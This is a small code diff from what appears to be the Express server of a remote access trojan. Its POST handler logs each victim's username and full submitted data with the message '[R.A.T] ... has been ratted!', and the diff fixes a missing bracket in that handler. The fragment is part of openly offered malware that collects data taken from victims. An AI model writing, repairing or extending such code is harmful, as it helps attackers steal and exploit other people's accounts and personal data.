@@ -192,7 +192,7 @@ app.post("/", (req, res) => {
 
             console.log(`[R.A.T] ${req.body.username} has been ratted!\n${JSON.stringify(req.body)}`)
         }
-    }
+    })
 
     //change this to whatever you want, but make sure to send a response
     res.send("OK")
